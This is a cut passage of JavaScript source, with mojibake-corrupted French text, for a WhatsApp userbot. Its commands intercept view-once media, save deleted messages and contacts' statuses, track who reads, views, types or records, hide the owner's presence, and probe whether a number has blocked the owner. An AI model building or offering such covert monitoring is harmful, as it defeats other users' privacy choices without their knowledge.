â€¢ ${config.PREFIXE}audioonce [on/off]
â€¢ ${config.PREFIXE}savestatus [on/off]
â€¢ ${config.PREFIXE}anticall [on/off]
â€¢ ${config.PREFIXE}antibot [on/off]
â€¢ ${config.PREFIXE}blockedbots - Liste des bots bloquÃ©s
`;
      return send(status);
    }

    case "viewonce":
    case "vueunique": {
      const param = args.toLowerCase();
      if (param === "on") protectionState.autoViewOnce = true;
      else if (param === "off") protectionState.autoViewOnce = false;
      else protectionState.autoViewOnce = !protectionState.autoViewOnce;
      
      return send(`ðŸ‘ï¸ Interception photos/vidÃ©os vue unique ${protectionState.autoViewOnce ? "âœ… activÃ©e" : "âŒ dÃ©sactivÃ©e"}`);
    }

    case "audioonce":
    case "vocalone": {
      const param = args.toLowerCase();
      if (param === "on") protectionState.autoViewOnceAudio = true;
      else if (param === "off") protectionState.autoViewOnceAudio = false;
      else protectionState.autoViewOnceAudio = !protectionState.autoViewOnceAudio;
      
      return send(`ðŸŽ¤ Interception vocaux Ã©coute unique ${protectionState.autoViewOnceAudio ? "âœ… activÃ©e" : "âŒ dÃ©sactivÃ©e"}`);
    }

    case "anticall": {
      const param = args.toLowerCase();
      if (param === "on") protectionState.anticall = true;
      else if (param === "off") protectionState.anticall = false;
      else protectionState.anticall = !protectionState.anticall;
      
      return send(`ðŸ“µ Anti-appel ${protectionState.anticall ? "âœ… activÃ© (appels rejetÃ©s)" : "âŒ dÃ©sactivÃ©"}`);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ANTI-DELETE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "antidelete": {
      const param = args.toLowerCase();
      if (param === "on") protectionState.antidelete = true;
      else if (param === "off") protectionState.antidelete = false;
      else protectionState.antidelete = !protectionState.antidelete;
      
      return send(`ðŸ—‘ï¸ Antidelete ${protectionState.antidelete ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
    }

    case "deleted":
    case "delmsg": {
      if (deletedMessages.length === 0) return send("ðŸ“­ Aucun message supprimÃ© interceptÃ©.");
      
      let list = "ðŸ—‘ï¸ *Messages supprimÃ©s rÃ©cents*\n\n";
      deletedMessages.slice(-10).forEach((del, i) => {
        list += `${i + 1}. De: ${del.sender}\n`;
        list += `   Type: ${del.type}\n`;
        if (del.text) list += `   "${del.text.substring(0, 50)}..."\n`;
        list += `   ${del.date}\n\n`;
      });
      return send(list);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ STATUTS / STORIES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "antideletestatus":
    case "savstatus":
    case "savestatus": {
      const param = args.toLowerCase();
      if (param === "on") protectionState.antideletestatus = true;
      else if (param === "off") protectionState.antideletestatus = false;
      else protectionState.antideletestatus = !protectionState.antideletestatus;
      
      return send(`ðŸ“¸ Sauvegarde auto des statuts ${protectionState.antideletestatus ? "âœ… activÃ©e" : "âŒ dÃ©sactivÃ©e"}`);
    }

    case "deletedstatus":
    case "delstatus":
    case "statusdel": {
      if (deletedStatuses.length === 0) return send("ðŸ“­ Aucun statut supprimÃ© interceptÃ©.");
      
      let list = "ðŸ“¸ *Statuts supprimÃ©s rÃ©cents*\n\n";
      deletedStatuses.slice(-10).forEach((status, i) => {
        list += `${i + 1}. ðŸ‘¤ ${status.pushName}\n`;
        list += `   ðŸ“± ${status.sender.split("@")[0]}\n`;
        list += `   ðŸ“ Type: ${status.type}\n`;
        list += `   ðŸ• PostÃ©: ${status.date}\n`;
        list += `   ðŸ—‘ï¸ SupprimÃ©: ${status.deletedAt}\n\n`;
      });
      return send(list);
    }

    case "getstatus":
    case "sendstatus": {
      // Envoyer un statut supprimÃ© spÃ©cifique
      const index = parseInt(args) - 1;
      if (isNaN(index) || index < 0 || index >= deletedStatuses.length) {
        return send(`âŒ NumÃ©ro invalide. Utilise .deletedstatus pour voir la liste (1-${deletedStatuses.length})`);
      }
      
      const status = deletedStatuses[index];
      if (!status) return send("âŒ Statut non trouvÃ©.");
      
      try {
        let caption = `ðŸ“¸ *Statut #${index + 1}*\n\n`;
        caption += `ðŸ‘¤ De: ${status.pushName}\n`;
        caption += `ðŸ“± ${status.sender.split("@")[0]}\n`;
        caption += `ðŸ• ${status.date}`;
        
        if (status.mediaBuffer) {
          if (status.type === "image") {
            await hani.sendMessage(botNumber, { 
              image: status.mediaBuffer, 
              caption: caption + (status.caption ? `\n\n"${status.caption}"` : "")
            });
          } else if (status.type === "video") {
            await hani.sendMessage(botNumber, { 
              video: status.mediaBuffer, 
              caption: caption + (status.caption ? `\n\n"${status.caption}"` : "")
            });
          } else if (status.type === "audio") {
            await send(caption);
            await hani.sendMessage(botNumber, { audio: status.mediaBuffer, mimetype: "audio/mp4" });
          }
        } else if (status.text) {
          await send(caption + `\n\nðŸ’¬ "${status.text}"`);
        } else {
          await send(caption + "\n\nâš ï¸ MÃ©dia non disponible");
        }
      } catch (e) {
        return send("âŒ Erreur: " + e.message);
      }
      return;
    }

    case "liststatus":
    case "statuslist":
    case "allstatus": {
      if (statusStore.size === 0) return send("ðŸ“­ Aucun statut sauvegardÃ©.");
      
      let list = "ðŸ“¸ *Tous les statuts sauvegardÃ©s*\n\n";
      let i = 1;
      for (const [id, status] of statusStore) {
        list += `${i}. ðŸ‘¤ ${status.pushName}\n`;
        list += `   ðŸ“ ${status.type}\n`;
        list += `   ðŸ• ${status.date}\n\n`;
        i++;
        if (i > 20) {
          list += `... et ${statusStore.size - 20} autres\n`;
          break;
        }
      }
      return send(list);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ VÃ‰RIFICATION BLOCAGE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "checkblock":
    case "blocked":
    case "isblocked": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNum = args.replace(/[^0-9]/g, "");
      
      // Si on rÃ©pond Ã  un message, utiliser ce numÃ©ro
      if (quotedMsg && msg.message?.extendedTextMessage?.contextInfo?.participant) {
        targetNum = msg.message.extendedTextMessage.contextInfo.participant.split("@")[0];
      }
      
      if (!targetNum || targetNum.length < 10) {
        return send(`âŒ SpÃ©cifie un numÃ©ro.\n\nUtilisation:\n${config.PREFIXE}checkblock 22550252467\n\nOu rÃ©ponds Ã  un message de la personne.`);
      }
      
      const targetJid = targetNum + "@s.whatsapp.net";
      
      try {
        // MÃ©thode 1: VÃ©rifier si on peut voir la photo de profil
        let profilePic = null;
        let canSeeProfile = true;
        try {
          profilePic = await hani.profilePictureUrl(targetJid, "image");
        } catch (e) {
          canSeeProfile = false;
        }
        
        // MÃ©thode 2: VÃ©rifier le statut "last seen" (prÃ©sence)
        let lastSeen = "Inconnu";
        try {
          await hani.presenceSubscribe(targetJid);
          // Attendre un peu pour la rÃ©ponse
          await new Promise(r => setTimeout(r, 2000));
        } catch (e) {
          // Erreur peut indiquer un blocage
        }
        
        // MÃ©thode 3: VÃ©rifier si le numÃ©ro existe sur WhatsApp
        let exists = false;
        try {
          const [result] = await hani.onWhatsApp(targetNum);
          exists = result?.exists || false;
        } catch (e) {
          exists = false;
        }
        
        const formatted = formatPhoneNumber(targetNum);
        let status = "";
        let blocked = false;
        
        if (!exists) {
          status = "âŒ Ce numÃ©ro n'est PAS sur WhatsApp";
        } else if (!canSeeProfile) {
          status = "âš ï¸ Impossible de voir la photo de profil\nðŸ”´ *Possiblement bloquÃ©* ou photo masquÃ©e";
          blocked = true;
        } else {
          status = "âœ… Tu n'es probablement PAS bloquÃ©";
        }
        
        const info = `
â•­â”â”â” ðŸ” *VÃ‰RIFICATION BLOCAGE* â”â”â”â•®
â”ƒ
â”ƒ ðŸ“± *NumÃ©ro:* ${formatted}
â”ƒ 
â”ƒ ðŸ“Š *RÃ©sultats:*
â”ƒ â€¢ Sur WhatsApp: ${exists ? "âœ… Oui" : "âŒ Non"}
â”ƒ â€¢ Photo visible: ${canSeeProfile ? "âœ… Oui" : "âŒ Non"}
${profilePic ? `â”ƒ â€¢ Photo: Disponible` : `â”ƒ â€¢ Photo: Non disponible`}
â”ƒ
â”ƒ ðŸŽ¯ *Conclusion:*
â”ƒ ${status}
â”ƒ
â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•¯

âš ï¸ *Note:* Cette vÃ©rification n'est pas 100% fiable.
Si la personne a masquÃ© sa photo pour tous, 
Ã§a peut donner un faux positif.
        `.trim();
        
        // Envoyer la photo de profil si disponible
        if (profilePic) {
          try {
            await hani.sendMessage(from, { 
              image: { url: profilePic }, 
              caption: info 
            });
            return;
          } catch (e) {
            // Si erreur, envoyer juste le texte
          }
        }
        
        return reply(info);
        
      } catch (e) {
        return send("âŒ Erreur: " + e.message);
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ TÃ‰LÃ‰CHARGER TOUS LES STATUTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "dlallstatus":
    case "getstatuts":
    case "allstatus": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (statusStore.size === 0) {
        return send("ðŸ“­ Aucun statut sauvegardÃ©.\n\nLes statuts sont sauvegardÃ©s automatiquement quand tes contacts en publient.");
      }
      
      await send(`ðŸ“¤ Envoi de ${statusStore.size} statut(s) sauvegardÃ©(s)...`);
      
      let sent = 0;
      for (const [id, status] of statusStore) {
        try {
          const caption = `ðŸ“¸ *Statut de ${status.pushName}*\nðŸ“± ${formatPhoneNumber(status.sender?.split("@")[0])}\nðŸ• ${status.date}`;
          
          if (status.mediaBuffer) {
            if (status.type === "imageMessage") {
              await hani.sendMessage(from, { 
                image: status.mediaBuffer, 
                caption: caption 
              });
              sent++;
            } else if (status.type === "videoMessage") {
              await hani.sendMessage(from, { 
                video: status.mediaBuffer, 
                caption: caption 
              });
              sent++;
            } else if (status.type === "audioMessage") {
              await hani.sendMessage(from, { 
                audio: status.mediaBuffer, 
                mimetype: "audio/mp4" 
              });
              sent++;
            }
          } else if (status.text) {
            await hani.sendMessage(from, { 
              text: `ðŸ“ *Statut texte de ${status.pushName}*\n\n"${status.text}"\n\nðŸ• ${status.date}` 
            });
            sent++;
          }
          
          // Pause pour Ã©viter le spam
          await new Promise(r => setTimeout(r, 1000));
          
        } catch (e) {
          console.log(`[!] Erreur envoi statut: ${e.message}`);
        }
      }
      
      return send(`âœ… ${sent}/${statusStore.size} statut(s) envoyÃ©(s).`);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ FUN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "sticker":
    case "s": {
      if (!quotedMsg) return send("âŒ RÃ©ponds Ã  une image ou vidÃ©o pour crÃ©er un sticker.");
      
      const mediaType = getContentType(quotedMsg);
      if (!["imageMessage", "videoMessage"].includes(mediaType)) {
        return send("âŒ RÃ©ponds Ã  une image ou vidÃ©o.");
      }
      
      try {
        const media = await downloadMediaMessage(
          { message: quotedMsg, key: msg.key },
          "buffer",
          {},
          { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
        );
        
        await hani.sendMessage(from, {
          sticker: media,
          packname: config.STICKER_PACK,
          author: config.STICKER_AUTHOR
        });
      } catch (e) {
        return send("âŒ Erreur crÃ©ation sticker: " + e.message);
      }
      return;
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ OUTILS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "calc":
    case "calculate": {
      if (!args) return send("âŒ Donne une expression. Ex: .calc 5+5*2");
      
      try {
        // SÃ©curitÃ©: n'autoriser que les caractÃ¨res mathÃ©matiques
        const sanitized = args.replace(/[^0-9+\-*/().%\s]/g, "");
        const result = eval(sanitized);
        return reply(`ðŸ”¢ *Calculatrice*\n\n${sanitized} = *${result}*`);
      } catch (e) {
        return send("âŒ Expression invalide.");
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ OWNER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "ban": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let target = mentioned[0] || quotedParticipant;
      if (!target) return send("âŒ Mentionne quelqu'un Ã  bannir.");
      
      db.ban(target);
      return reply(`ðŸš« @${target.split("@")[0]} est banni du bot.`, { mentions: [target] });
    }

    case "unban": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let target = mentioned[0] || quotedParticipant;
      if (!target) return send("âŒ Mentionne quelqu'un Ã  dÃ©bannir.");
      
      db.unban(target);
      return reply(`âœ… @${target.split("@")[0]} est dÃ©banni.`, { mentions: [target] });
    }

    case "banlist": {
      if (!isSudo) return send("âŒ Commande rÃ©servÃ©e aux sudos.");
      
      if (db.data.banned.length === 0) return send("âœ… Aucun utilisateur banni.");
      
      let list = "ðŸš« *Utilisateurs bannis*\n\n";
      db.data.banned.forEach((jid, i) => {
        list += `${i + 1}. @${jid.split("@")[0]}\n`;
      });
      return hani.sendMessage(from, { text: list, mentions: db.data.banned });
    }

    case "sudo":
    case "addsudo": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let target = mentioned[0] || quotedParticipant;
      if (!target) return send("âŒ Mentionne quelqu'un.");
      
      db.addSudo(target);
      return reply(`ðŸ‘‘ @${target.split("@")[0]} est maintenant sudo.`, { mentions: [target] });
    }

    case "delsudo":
    case "removesudo": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let target = mentioned[0] || quotedParticipant;
      if (!target) return send("âŒ Mentionne quelqu'un.");
      
      db.removeSudo(target);
      return reply(`âœ… @${target.split("@")[0]} n'est plus sudo.`, { mentions: [target] });
    }

    case "sudolist": {
      if (!isSudo) return send("âŒ Commande rÃ©servÃ©e aux sudos.");
      
      if (db.data.sudo.length === 0) return send("ðŸ“­ Aucun sudo configurÃ©.");
      
      let list = "ðŸ‘‘ *Sudos*\n\n";
      db.data.sudo.forEach((jid, i) => {
        list += `${i + 1}. @${jid.split("@")[0]}\n`;
      });
      return hani.sendMessage(from, { text: list, mentions: db.data.sudo });
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ âœ… GESTION DES UTILISATEURS APPROUVÃ‰S â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "approve":
    case "addapprove": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      let target = mentioned[0] || quotedParticipant;
      
      if (!target && !targetNumber) {
        return send(`âŒ *Usage:* .approve [numÃ©ro ou @mention]
        
ðŸ“± *Exemples:*
â€¢ .approve 22550252467
â€¢ .approve @mention
â€¢ RÃ©ponds Ã  un message avec .approve

âœ¨ *Info:* Les utilisateurs approuvÃ©s peuvent utiliser des commandes comme GPT, DALL-E, tÃ©lÃ©chargements, etc.`);
      }
      
      if (!target && targetNumber) {
        target = targetNumber + "@s.whatsapp.net";
      }
      
      const targetNum = target.split("@")[0];
      if (db.addApproved(targetNum)) {
        return hani.sendMessage(from, { 
          text: `âœ… *Utilisateur approuvÃ©!*\n\nðŸ“± @${targetNum}\n\nâœ¨ Il/Elle peut maintenant utiliser les commandes IA, tÃ©lÃ©chargements et plus!`, 
          mentions: [target] 
        });
      } else {
        return send(`âš ï¸ @${targetNum} est dÃ©jÃ  approuvÃ©.`);
      }
    }

    case "unapprove":
    case "removeapprove":
    case "delapprove": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      let targetNumber = args?.replace(/[^0-9]/g, "");
      let target = mentioned[0] || quotedParticipant;
      
      if (!target && !targetNumber) {
        return send(`âŒ *Usage:* .unapprove [numÃ©ro ou @mention]`);
      }
      
      if (!target && targetNumber) {
        target = targetNumber + "@s.whatsapp.net";
      }
      
      const targetNum = target.split("@")[0];
      if (db.removeApproved(targetNum)) {
        return hani.sendMessage(from, { 
          text: `âœ… *AccÃ¨s retirÃ©!*\n\nðŸ“± @${targetNum} n'est plus approuvÃ©.`, 
          mentions: [target] 
        });
      } else {
        return send(`âš ï¸ @${targetNum} n'Ã©tait pas dans la liste des approuvÃ©s.`);
      }
    }

    case "approved":
    case "approvelist":
    case "approvedlist": {
      if (!isSudo) return send("âŒ Commande rÃ©servÃ©e aux sudos.");
      
      const approvedList = db.getApprovedList();
      
      if (approvedList.length === 0) {
        return send(`ðŸ“­ *Aucun utilisateur approuvÃ©*

âœ¨ Utilise \`.approve @mention\` pour ajouter quelqu'un.

ðŸ‘¥ *Niveaux d'accÃ¨s:*
â€¢ ðŸ‘‘ *Owner:* AccÃ¨s total
â€¢ ðŸ›¡ï¸ *Sudo:* Commandes admin
â€¢ âœ… *ApprouvÃ©:* IA, downloads, jeux
â€¢ ðŸ‘¤ *Public:* Menu, ping, sticker`);
      }
      
      let list = `âœ… *Utilisateurs ApprouvÃ©s (${approvedList.length})*\n\n`;
      const jidList = [];
      approvedList.forEach((num, i) => {
        const jid = num.includes("@") ? num : num + "@s.whatsapp.net";
        jidList.push(jid);
        list += `${i + 1}. @${num.replace("@s.whatsapp.net", "")}\n`;
      });
      
      list += `\nðŸ‘‘ Pour retirer: \`.unapprove @mention\``;
      
      return hani.sendMessage(from, { text: list, mentions: jidList });
    }

    case "anticall": {
      if (!isSudo) return send("âŒ Commande rÃ©servÃ©e aux sudos.");
      
      const param = args.toLowerCase();
      if (param === "on") protectionState.anticall = true;
      else if (param === "off") protectionState.anticall = false;
      else protectionState.anticall = !protectionState.anticall;
      
      return send(`ðŸ“ž Anticall ${protectionState.anticall ? "âœ… activÃ©" : "âŒ dÃ©sactivÃ©"}`);
    }

    case "restart": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      await send("ðŸ”„ RedÃ©marrage en cours...");
      process.exit(0);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ‘» PRÃ‰SENCE / INVISIBILITÃ‰ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "invisible":
    case "presence":
    case "online": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const param = args?.toLowerCase();
      
      if (param === "on") {
        // Activer le mode invisible (ON = devenir invisible)
        spyConfig.ghostMode = true;
        spyConfig.ghostModeAdvanced.hideOnline = true;
        spyConfig.ghostModeAdvanced.hideTyping = true;
        spyConfig.ghostModeAdvanced.hideRead = true;
        spyConfig.ghostModeAdvanced.hideRecording = true;
        
        // DÃ©marrer le maintien de prÃ©sence invisible
        startGhostMode(hani);
        
        await hani.sendPresenceUpdate("unavailable");
        return send(`ðŸ‘» *Mode INVISIBLE activÃ©!*

âœ… Tu n'apparais plus "en ligne" sur WhatsApp.
â€¢ âšª Personne ne te voit en ligne
â€¢ âœï¸ "Ã‰crit..." n'est pas envoyÃ©
â€¢ âœ… Confirmations de lecture bloquÃ©es
â€¢ ðŸ”„ Mode maintenu en continu

âš ï¸ Tu peux toujours voir les activitÃ©s des autres!

ðŸ’¡ Utilise \`.invisible off\` pour redevenir visible.`);
      } else if (param === "off") {
        // Désactiver le mode invisible (OFF = redevenir visible)
        spyConfig.ghostMode = false;
        spyConfig.ghostModeAdvanced.hideOnline = false;
        spyConfig.ghostModeAdvanced.hideTyping = false;
        spyConfig.ghostModeAdvanced.hideRead = false;
        spyConfig.ghostModeAdvanced.hideRecording = false;
        
        // ArrÃªter le maintien invisible
        stopGhostMode(hani);
        
        await hani.sendPresenceUpdate("available");
        return send(`ðŸ‘ï¸ *Mode VISIBLE activÃ©!*

âœ… Tu apparais maintenant "en ligne" normalement.
â€¢ ðŸŸ¢ Les autres te voient en ligne
â€¢ âœï¸ "Ã‰crit..." est visible
â€¢ âœ… Confirmations de lecture envoyÃ©es

ðŸ’¡ Utilise \`.invisible on\` pour devenir invisible.`);
      } else {
        const status = spyConfig.ghostMode ? "ðŸ‘» INVISIBLE" : "ðŸ‘ï¸ VISIBLE";
        const intervalStatus = ghostModeInterval ? "ðŸŸ¢ Actif" : "âšª Inactif";
        return send(`ðŸ‘» *Gestion de la prÃ©sence*

ðŸ“Š *Ã‰tat actuel:* ${status}
ðŸ”„ *SystÃ¨me:* ${intervalStatus}

*Usage:*
â€¢ \`.invisible on\` - Devenir invisible
â€¢ \`.invisible off\` - Redevenir visible

*Ce que fait le mode invisible:*
â€¢ Personne ne te voit "en ligne"
â€¢ "Ã‰crit..." n'est pas envoyÃ©
â€¢ Confirmations de lecture bloquÃ©es
â€¢ Mode maintenu en continu automatiquement`);
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ•µï¸ ESPIONNAGE: QUI VOIT/LIT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "spy":
    case "espion":
    case "viewers":
    case "stalkers": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const param = args?.toLowerCase();
      
      // Fonction locale pour formater le numÃ©ro
      const formatNum = (num) => {
        if (!num) return "Inconnu";
        const clean = num.replace(/[^0-9]/g, '');
        if (clean.length === 12 && clean.startsWith("225")) {
          return `+225 ${clean.slice(3,5)} ${clean.slice(5,7)} ${clean.slice(7,9)} ${clean.slice(9,11)} ${clean.slice(11)}`;
        } else if (clean.length >= 10) {
          return `+${clean.slice(0,3)} ${clean.slice(3,6)} ${clean.slice(6,9)} ${clean.slice(9)}`;
        }
        return `+${clean}`;
      };
      
      if (param === "status" || param === "statuts" || param === "vues") {
        // Afficher qui a vu les statuts
        if (spyData.statusViews.length === 0) {
          return send(`ðŸ‘ï¸ *Aucune vue de statut enregistrÃ©e*

_Poste un statut et attends que quelqu'un le regarde!_`);
        }
        
        let list = `ðŸ‘ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    *QUI A VU TES STATUTS*
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
        const uniqueViewers = {};
        
        // Compter les vues par personne
        for (const view of spyData.statusViews) {
          if (!uniqueViewers[view.viewer]) {
            uniqueViewers[view.viewer] = { name: view.viewerName, count: 0, lastTime: view.timeStr };
          }
          uniqueViewers[view.viewer].count++;
        }
        
        let i = 1;
        for (const [num, data] of Object.entries(uniqueViewers)) {
          const displayName = data.name || "Non enregistrÃ©";
          list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}
   ðŸ“± *NumÃ©ro:* ${formatNum(num)}
   ðŸ”¢ *Brut:* ${num}
   ðŸ‘ï¸ ${data.count} vue(s) â€¢ ðŸ• ${data.lastTime}
   ðŸ’¬ wa.me/${num}\n\n`;
          i++;
          if (i > 15) break;
        }
        
        list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ðŸ“Š *Total:* ${spyData.statusViews.length} vues de ${uniqueViewers ? Object.keys(uniqueViewers).length : 0} personnes`;
        return send(list);
        
      } else if (param === "messages" || param === "read" || param === "lu") {
        // Afficher qui a lu les messages
        if (spyData.messageReads.length === 0) {
          return send(`ðŸ“– *Aucune lecture enregistrÃ©e*

_Envoie des messages et attends qu'ils soient lus!_`);
        }
        
        let list = `ðŸ“– â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    *QUI A LU TES MESSAGES*
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
        const uniqueReaders = {};
        
        // Compter les lectures par personne
        for (const read of spyData.messageReads) {
          if (!uniqueReaders[read.reader]) {
            uniqueReaders[read.reader] = { name: read.readerName, count: 0, lastTime: read.timeStr };
          }
          uniqueReaders[read.reader].count++;
        }
        
        let i = 1;
        for (const [num, data] of Object.entries(uniqueReaders)) {
          const displayName = data.name || "Non enregistrÃ©";
          list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}
   ðŸ“± *NumÃ©ro:* ${formatNum(num)}
   ðŸ”¢ *Brut:* ${num}
   ðŸ“– ${data.count} msg lu(s) â€¢ ðŸ• ${data.lastTime}
   ðŸ’¬ wa.me/${num}\n\n`;
          i++;
          if (i > 15) break;
        }
        
        list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ðŸ“Š *Total:* ${spyData.messageReads.length} lectures de ${uniqueReaders ? Object.keys(uniqueReaders).length : 0} personnes`;
        return send(list);
        
      } else if (param === "on") {
        protectionState.spyStatusViews = true;
        protectionState.spyReadReceipts = true;
        protectionState.spyReplies = true;
        protectionState.spyPresence = true;
        return send(`ðŸ•µï¸ *MODE ESPION ACTIVÃ‰* âœ…

Tu recevras des notifications quand:
â€¢ ðŸ‘ï¸ Quelqu'un voit tes statuts
â€¢ ðŸ“– Quelqu'un lit tes messages (si activÃ© chez lui)
â€¢ â†©ï¸ Quelqu'un RÃ‰POND Ã  tes messages (PREUVE!)
â€¢ ðŸ’¬ Quelqu'un t'Ã©crit aprÃ¨s ton message (PREUVE!)
â€¢ âœï¸ Quelqu'un est en train d'Ã‰CRIRE dans ton chat!
â€¢ ðŸŽ¤ Quelqu'un ENREGISTRE un vocal pour toi!

ðŸ’¡ \`.spy off\` pour dÃ©sactiver`);
        
      } else if (param === "off") {
        protectionState.spyStatusViews = false;
        protectionState.spyReadReceipts = false;
        protectionState.spyReplies = false;
        protectionState.spyPresence = false;
        return send(`ðŸ•µï¸ *MODE ESPION DÃ‰SACTIVÃ‰* âŒ

Plus de notifications de vues/lectures/prÃ©sence.

ðŸ’¡ \`.spy on\` pour rÃ©activer`);
        
      } else if (param === "clear" || param === "reset") {
        spyData.statusViews = [];
        spyData.messageReads = [];
        spyData.replies = [];
        spyData.pendingMessages = {};
        spyData.presenceDetected = [];
        spyData.presenceCooldown = {};
        return send(`ðŸ—‘ï¸ *Historique effacÃ©*

âœ… Toutes les donnÃ©es de vues, lectures, rÃ©ponses et prÃ©sences supprimÃ©es.`);
        
      } else if (param === "presence" || param === "presences" || param === "actifs") {
        // Afficher qui a Ã©tÃ© dÃ©tectÃ© actif dans le chat
        if (!spyData.presenceDetected || spyData.presenceDetected.length === 0) {
          return send(`âœï¸ *Aucune prÃ©sence dÃ©tectÃ©e*

_Attends que quelqu'un ouvre ta discussion et commence Ã  Ã©crire!_

ðŸ’¡ Ce systÃ¨me dÃ©tecte quand quelqu'un:
â€¢ âœï¸ Est en train d'Ã©crire dans ton chat
â€¢ ðŸŽ¤ Enregistre un vocal pour toi
â€¢ ðŸ‘ï¸ Est actif/en ligne dans ta discussion`);
        }
        
        let list = `âœï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    *QUI A OUVERT TON CHAT*
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
        const uniquePresences = {};
        
        // Compter les prÃ©sences par personne
        for (const presence of spyData.presenceDetected) {
          if (!uniquePresences[presence.number]) {
            uniquePresences[presence.number] = { 
              name: presence.name, 
              count: 0, 
              actions: new Set(),
              lastTime: new Date(presence.timestamp).toLocaleString("fr-FR")
            };
          }
          uniquePresences[presence.number].count++;
          uniquePresences[presence.number].actions.add(presence.action);
        }
        
        let i = 1;
        for (const [num, data] of Object.entries(uniquePresences)) {
          const displayName = data.name || "Non enregistrÃ©";
          const actionsStr = Array.from(data.actions).map(a => {
            switch(a) {
              case "composing": return "âœï¸";
              case "recording": return "ðŸŽ¤";
              case "available": return "ðŸ‘ï¸";
              default: return "ðŸ“±";
            }
          }).join("");
          list += `*${i}.* ${displayName !== "Non enregistrÃ©" && displayName !== "Inconnu" ? `*${displayName}*` : "_Contact inconnu_"}
   ðŸ“± *NumÃ©ro:* ${formatNum(num)}
   ${actionsStr} ${data.count} dÃ©tection(s) â€¢ ðŸ• ${data.lastTime}
   ðŸ’¬ wa.me/${num}\n\n`;
          i++;
          if (i > 15) break;
        }
        
        list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ðŸ“Š *Total:* ${spyData.presenceDetected.length} dÃ©tections de ${Object.keys(uniquePresences).length} personnes

*LÃ©gende:*
âœï¸ = En train d'Ã©crire
ðŸŽ¤ = Enregistre un vocal
ðŸ‘ï¸ = Actif dans le chat`;
        return send(list);
        
      } else {
        // RÃ©sumÃ© par dÃ©faut
        const statusCount = spyData.statusViews.length;
        const readCount = spyData.messageReads.length;
        const repliesCount = spyData.replies?.length || 0;
        const presenceCount = spyData.presenceDetected?.length || 0;
        const uniqueStatusViewers = new Set(spyData.statusViews.map(v => v.viewer)).size;
        const uniqueReadersCount = new Set(spyData.messageReads.map(r => r.reader)).size;
        const uniquePresenceCount = new Set((spyData.presenceDetected || []).map(p => p.number)).size;
        
        // DerniÃ¨res personnes
        let lastViewers = "";
        let lastReaders = "";
        let lastPresences = "";
        
        if (spyData.statusViews.length > 0) {
          const last3 = spyData.statusViews.slice(0, 3);
          lastViewers = last3.map(v => {
            const name = v.viewerName || "Inconnu";
            return `â€¢ ${name} (${formatNum(v.viewer)})`;
          }).join("\n");
        }
        
        if (spyData.messageReads.length > 0) {
          const last3 = spyData.messageReads.slice(0, 3);
          lastReaders = last3.map(r => {
            const name = r.readerName || "Inconnu";
            const method = r.confirmedBy ? ` [${r.confirmedBy}]` : "";
            return `â€¢ ${name} (${formatNum(r.reader)})${method}`;
          }).join("\n");
        }
